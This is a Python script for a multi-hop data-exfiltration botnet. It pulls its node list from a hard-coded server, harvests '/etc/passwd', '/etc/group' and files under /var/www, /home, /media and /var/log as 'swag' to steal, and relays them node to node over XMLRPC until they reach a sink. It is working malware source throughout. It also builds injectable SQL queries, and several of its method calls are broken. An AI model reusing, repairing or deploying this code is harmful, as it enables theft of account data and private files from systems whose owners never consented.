import os, re, socket, subprocess, sys, time, shutil, logging
import xml.etree.ElementTree as etree
import sqlite3 as sql
import urllib.request
import multiprocessing as mp
import xmlrpc.client
from time import strftime
from xmlrpc.server import SimpleXMLRPCServer
from xmlrpc.server import SimpleXMLRPCRequestHandler
from socketserver import ThreadingMixIn
class StartBot(object):
    ##### Set global configuration parms #####
    # How often does the XMLRPC client check
    # for new files to forward downstream?
    client_delay = 30
    # How long to wait for servers to respond?
    default_delay = 3
    socket.setdefaulttimeout(default_delay)
    # Where is the men.xml file available?
    xml_url = 'http://10.0.1.221:82/men.xml'
    # Where is men.xml data stored locally?
    db = 'men.db'
    # Where are incoming/outgoing files stored?
    data_dir = 'data'
    # What files are we after on node 0?
    # Files in this list are priority #1
    myfiles = ['/etc/passwd', '/etc/group']
    # Files in the following directories (if they exist)
    # are priority #2 and up, from left-to-right
    mydirs = ['/var/www','/usr/lib/cgi-bin','/var/log','/home','/media']

    class RequestHandler(ThreadingMixIn, SimpleXMLRPCRequestHandler):
        '''A (very) simple threaded XMLRPC server that accepts file
        uploads from client instances.
        '''
        def __init__(self, ip, port, lock, logger):
            self.logger = logger
            try:
                self.server = SimpleXMLRPCServer((ip, port), logRequests=False)
            except Exception as e:
                self.logger.critical('The XMLRPC server won\'t start: %s', e)
                sys.exit(1)
            # A synchronization variable so we're not fighting with clients over files
            # in the data directory
            self.lock = lock
            # This method gives us a way to check connectivity for clients
            self.server.register_introspection_functions()
            self.server.register_function(self.server_receive_file, 'server_receive_file')
            if not os.path.exists(StartBot.data_dir):
                try:
                    os.makedirs(StartBot.data_dir)
                except OSError as e:
                    self.logger.critical('ERROR: XMLRPC server unable to create data directory: %s', e)
                    sys.exit(1)
            try:
                self.server.serve_forever()
            except KeyboardInterrupt:
                self.logger.info('XMLRPC server exiting normally in response to KILL signal')
                sys.exit(0)

        def server_receive_file(self, filename, contents):
            self.logger.info('XMLRPC server received file from upstream client %s', filename.split('_')[0].replace('-', '.'))
            self.lock.acquire()
            with open(StartBot.data_dir + '/' + filename, "wb") as handle:
                handle.write(contents.data)
            self.lock.release()
            return True                                                                                                                                            
    ### End of RequestHandler class ###

    def get_my_IP(self):
        p=subprocess.Popen('ifconfig',stdout=subprocess.PIPE,stderr=None,shell=True)
        output = str(p.communicate())
        p1 = re.compile('inet addr:\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}  Bcast')
        line = p1.findall(output)
        ipaddress = line[0].split(':')[1].split()[0]
        return ipaddress

    def get_my_config(self, conn, myIP):
        try:
            c = conn.cursor()
            c.execute('select port, seq_no from men where ip=?', (myIP,))
            my_config = c.fetchone()
            c.close()
            return my_config
        except:
            return None
        
    def get_next_hops(self, conn, seq_no):
        c = conn.cursor()
        c.execute('select max(seq_no) from men')
        last = c.fetchone()
        c.execute("select ip, port from men where active = 'True' and seq_no > ?  and seq_no <= ? order by seq_no", (str(seq_no), last[0], ))
        next = c.fetchall()
        c.close()
        return next

    def create_men_db(self, conn):
        '''Create a local SQLite3 database and table to hold data on exfiltration bots'''
        # Connection object comes from the caller
        c = conn.cursor()
        c.execute('drop table if exists men')
        c.execute('create table men(ip text, port text, seq_no integer, active bool)')
        conn.commit()
        c.close()

    def create_file_db(self, conn):
        '''Create a table in the local SQLite3 database to hold data on files to steal'''
        # Connection object comes from the caller
        try:
            c = conn.cursor()
            c.execute('drop table if exists swag')
            c.execute('create table swag(name text, dtg datetime, priority integer, stolen bool)')
            conn.commit()
            c.close()
        except Exception as e:
            logger.critical('ERROR: Unable to create file table: %s', e)
            sys.exit(1)

    def steal_a_file(self, conn, my_ip):
        '''Get the highest priority "unstolen" file in the files table and copy it to the datadir'''
        c = conn.cursor()
        # First get the name of the file
        c.execute('select name from swag where stolen = 0 order by priority limit 1')
        file = c.fetchone()
        # Now, update the status of this file in the db
        c.execute('update swag set stolen=\'1\' where name = ?', file)
        conn.commit()
        c.close()
        # Finally, transfer the file to the data_dir for exfil
        shutil.copyfile(file[0], StartBot.data_dir + '/' + my_ip.replace('.', '-') + file[0].replace('/','_'))

    def store_file_info(self, conn, filelst):
        '''Store the data from the file list in a local SQLite3 database'''
        # Loop through the filelst and insert the data for each
        # in the local database pointed to by the conn object
        c = conn.cursor()
        for file in filelst:
            query = "insert into swag values("
            for item in file[:-1]:
                query += "'" + str(item) + "',"
            query += "'" + str(file[-1]) + "')"
            try:
                c.execute(query)
            except:
                pass
        conn.commit()
        c.close()

    def parseXML(self, url, file='men.xml'):
        '''Go and get the XML file with the bot data'''
        try:
            # Grab the file and store it locally
            urllib.request.urlretrieve(url, file)
            # Parse it for processing and return it
            tree = etree.parse(file).getroot()
            return tree
        except:
            return None

    def forward_files(self, proxy, hops, files, lock, logger):
        '''Send newly-arrived files to the closest available
        downstream server.
        '''
        # First, try a 'comm-check' with our proxy. If we can't reach that server, we'll continue the comm-
        # checks down the sequence until either a server answers or we run out of servers to try.
        hop = 0
        while hop < len(hops):
            logger.info('Trying to forward my files to %s', proxy)
            try:
                proxy.system.listMethods()
                break
            except Exception as e:
                hop += 1
                logger.warning('Client unable to connect to downstream server %s', proxy)
                if hop >= len(hops):
                    logger.warning('No more hops to try. Will attempt to transfer files later.')
                    return
                else:
                    server_url = 'http://' + hops[hop][0] + ':' + hops[hop][1] + '/'
                    proxy = xmlrpc.client.ServerProxy(server_url)
                    logger.info('Trying next hop: %s', proxy)

        for file in files:
            if os.path.isfile(StartBot.data_dir + '/' + file):
                if lock != None:
                    lock.acquire()
                with open(StartBot.data_dir + '/' + file, "rb") as handle:
                    binary_data = xmlrpc.client.Binary(handle.read())
                proxy.server_receive_file(file, binary_data)
                if lock != None:
                    lock.release()
        for file in files:
            if lock != None:
                lock.acquire()
            os.remove(StartBot.data_dir + '/' + file)
            if lock != None:
                lock.release()
        logger.info('Successfully forwarded my files to %s', proxy)

    def store_bot_info(self, tree, conn):
        '''Store the data from the XML file in a local SQLite3 database'''
        # Loop through the XML tree and insert the data for each bot
        # in the local database pointed to by the conn object
        c = conn.cursor()
        for child in tree:
            data = []
            query = "insert into men values("
            for node in child.getchildren():
                data.append(node.text)
            for item in data[:-1]:
                query += "'" + item + "',"
            query += "'" + data[-1] + "')"
            c.execute(query)
            conn.commit()
        c.close()

    def main(self):
        '''Main functionality for the data-exfil botnet nodes. If this node is not the source, then an XMLRPC server
        will be created as a child process. If this node is not the sink, then an XMLRPC client object will be
        created and managed here, as well.
        '''
        ### Set up logging
        # Create logger
        #logging.basicConfig(filename='startbot.log',level=logging.DEBUG)
        logger = logging.getLogger('startbot.py')
        logger.setLevel(logging.INFO)
        # Create logging console handler and set level to info
        ch = logging.StreamHandler()
        #ch = logging.FileHandler('startbot.log')
        ch.setLevel(logging.INFO)
        # Create logging formatter
        formatter = logging.Formatter('%(asctime)s [%(name)s] %(levelname)s: %(message)s', '%b %e %H:%M:%S')
        # Add formatter to logging console handler
        ch.setFormatter(formatter)
        # Add logging console handler to logger
        logger.addHandler(ch)
        ### Get my ip address
        my_ip = self.get_my_IP()
        logger.info('My IP is %s', my_ip)
        # We'll use just one db connection and pass it around, as needed
        conn = sql.connect(StartBot.db)
        # Get the tree from the men.xml file
        tree = self.parseXML(StartBot.xml_url)
        if tree != None:
            # Create/open and then populate the men database
            self.create_men_db(conn)
            self.store_bot_info(tree, conn)
        else:
            logger.warning('Can\'t reach the server. Using an old copy, if one exists!')
        # What's my assigned server port number and seq_no?
        my_config = self.get_my_config(conn, my_ip)
        if my_config == None:
            logger.critical('No botnet info available from XML server for my node! Exiting...')
            sys.exit(1)
        my_port, my_seq_no = my_config
        # At this point, we have all the info needed to fire up an XMLRPC server
        logger.info('My port number is %s, and my sequence number is %s', my_port, my_seq_no)
        # We'll only start a server if my_seq_no > 0
        # We also only need a lock if we need a server
        server = None
        lock = None
        if my_seq_no > 0:
            # Create a lock that we'll use for access to the data_dir
            # in sync with our XMLRPC server
            lock = mp.Lock()
            try:
                logger.info('Spawning child process for XMLRPC server')
                server = mp.Process(target=self.RequestHandler, args=(my_ip, int(my_port), lock, logger))
                server.start()
                time.sleep(1)
                if server.is_alive():
                    pass
                else:
                    logger.critical('XMLRPC server did not start. Exiting...')
                    sys.exit(1)
            except Exception as e:
                logger.critical('Unable to start XMLRPC server instance: %s. Exiting...', e)
        # For all but the source node, the data_dir is created when the server instance
        # is instantiated. This else block ensures that the data_dir exists at the source.
        # We also need to create and populate the database table for files to exfil
        else:
            logger.info('My sequence number is 0, so I\'m NOT creating an XMLRPC server')
            if not os.path.exists(StartBot.data_dir):
                try:
                    os.makedirs(StartBot.data_dir)
                except OSError as e:
                    logger.critical('XMLRPC client at source unable to create data directory: %s', e)
                    sys.exit(1)
            # Create the table for files
            create_file_db(conn)
            # Populate a list of files for exfil
            filelst = []
            priority = 1
            stolen = 0
            # myfiles is a list with priority one individual files
            # This loop creates a list, along with the last-modified
            # time for each, as well as default values for their
            # priority and whether they've already been "stolen"
            for file in myfiles:
                try:
                    mtime = time.ctime(os.path.getmtime(file))
                    mtime = time.strftime('%Y-%m-%d %H:%M:%S', time.strptime(mtime, "%a %b %d %H:%M:%S %Y"))
                    filelst.append([file, mtime, priority, stolen])
                except:
                    pass
            # mydirs is a list of directories containing interesting
            # files to steal. They're listed in priority order, from
            # highest to lowest
            for dir in mydirs:
                priority += 1
                for root, dirs, files in os.walk(dir, topdown=True):
                    for name in files:
                        file = os.path.join(root, name)
                        try:
                            mtime = time.ctime(os.path.getmtime(file))
                            mtime = time.strftime('%Y-%m-%d %H:%M:%S', time.strptime(mtime, "%a %b %d %H:%M:%S %Y"))
                            filelst.append([file, mtime, priority, stolen])
                        except:
                            pass
            # Store the file list in the local database
            logger.info('Building data table on files to steal')
            store_file_info(conn, filelst)
            logger.info('All file data successfully stored')
        # Now, who is our next hop? We need this to define which server
        # to connect our client to, if any...
        next_hops = self.get_next_hops(conn, my_seq_no)
        # If the return value is None, that should mean we're the last
        # hop, in which case we won't be creating a client.
        client = False
        if len(next_hops) > 0:
            client = True
            tries = hop = 0
            proxy = None
            server_url = 'http://' + next_hops[hop][0] + ':' + next_hops[hop][1] + '/'
            try:
                # Instantiate the client. The constructor doesn't try to
                # connect. We're taking it on faith at this point that
                # the server will be there when we want it
                proxy = xmlrpc.client.ServerProxy(server_url)
                logger.info('Client created for XMLRPC server %s', server_url)
            except Exception as e:
                logger.critical('Unable to create client instance for downstream server: %s', e)
                if server != None:
                    logger.info('Terminating XMLRPC server process before exiting')
                    server.terminate()
                sys.exit(1)
        else:
            logger.info('No downstream server exists, so skipping XMLRPC client creation.')
        # Here's our 'infinite' loop
        while True:
            try:
                # Whew! Let's get some rest...
                logger.info('Resting for %s seconds...', str(StartBot.client_delay))
                time.sleep(StartBot.client_delay)
                # Okay, now let's check on the server, if we have one...
                # If it's not running, we're not doing any good, so we might as well exit.
                # Later, maybe add code to restart the server if it's down...
                if server != None and not server.is_alive():
                    logger.critical('My XMLRPC server seems to have left the building. Exiting...')
                    break
                # Check to see whether any new files have come our way since the last
                # loop iteration.
                if my_seq_no == 0:
                    steal_a_file(conn, my_ip)
                files = os.listdir(StartBot.data_dir)
                logger.info('Files in the data directory: %s', files)
                # For those bots that have clients, we need to send these files to the
                # downstream server
                if client and len(files) > 0:
                    self.forward_files(proxy, next_hops, files, lock, logger)
            except KeyboardInterrupt:
                logger.info('Main program shutting down')
                break
            except Exception as e:
                logger.info('Something bad happened: %s. It\'s not my fault!', e)
                break

if __name__=='__main__':
    bot = StartBot()
    bot.main()
